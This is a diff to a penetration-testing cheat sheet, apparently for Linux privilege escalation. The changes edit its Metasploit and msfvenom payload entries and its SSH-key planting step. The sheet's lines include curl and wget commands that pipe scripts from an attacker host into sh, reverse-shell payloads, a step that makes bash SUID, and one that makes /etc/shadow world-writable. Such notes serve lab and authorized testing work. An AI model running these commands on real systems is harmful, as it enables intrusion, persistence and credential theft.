@@ -4,6 +4,10 @@
     *   LinPEAS
     *   LinEnum
 *   Shells & Payloads
+    *   Metasploit
+        *   `msfconsole` → `search [COMPONENT]` → `use [EXPLOIT]` → `options`
+        *   `set payload linux/[x86/x64]/shell/[BIND/REVERSE]_tcp` → Also test `meterpreter` 
+        *   `set payload linux/[x86/x64]/shell_[BIND/REVERSE]_tcp`
     *   Web Shells
         *   `ls -la /usr/share/webshells` + [Public Repository](https://github.com/nicholasaleks/webshells)
         *   ASP / ASPX / PHP / PL / RB / CFM / JSP / WAR (Tomcat)
@@ -16,7 +20,7 @@
         *   `wget -q -O - http://[KALI_IP]/[SCRIPT] | sh`
         *   `curl -s http://[KALI_IP]/[SCRIPT] | sh`
     *   SSH Hijacking
-        *   `ssh-keygen -t ed25519 -f [KEY_FILE]` → Paste in `C:\Users\[USERNAME]\.ssh\authorized_keys`
+        *   `ssh-keygen -t ed25519 -f [KEY_FILE]` → Paste in `/home/[VICTIM_USER]/.ssh/authorized_keys`
         *   `chmod 600 [KEY_FILE]`
         *   `ssh -i [KEY_FILE] [USER]@[IP]`
     *   MSFVenom
@@ -27,13 +31,9 @@
             *   PHP                → `-p php/meterpreter/reverse_tcp -f raw`
             *   WAR / JSP     → `-p java/shell_reverse_tcp -f war`
         *   BOF Shellcode
-            *   `-a [x86/x64] -p [SHELL_TYPE] -f [python/c] -b [BAD_CHARS] -e [ENCODER] -i 3 --smallest` 
+            *   `msfvenom -a [x86/x64] -p [SHELL_TYPE] -f [python/c] -b [BAD_CHARS] -e [ENCODER] -i 3 --smallest` 
             *   Encoders         → `x86/shikata_ga_nai` / `x86/unicode_m`
-            *   Extra Options → `BufferRegister=EAX` / `Exitfunc=thread`
-    *   Metasploit
-        *   `msfconsole` → `search [COMPONENT]` → `use [EXPLOIT]` → `options`
-        *   `set payload windows/[EMPTY/X64]/shell/[BIND/REVERSE]_tcp`
-        *   `set payload windows/[EMPTY/X64]/shell_[BIND/REVERSE]_tcp`
+            *   Extra Options    → `BufferRegister=EAX` / `Exitfunc=thread`
     *   Bash Payloads
         *   `chmod u+s /bin/bash`       → `/bin/bash -p` → Give SUID to Shell [GTFOBin](https://gtfobins.github.io/)(`find` / Other)
         *   `chmod 777 /etc/shadow`   → Hash Cracking
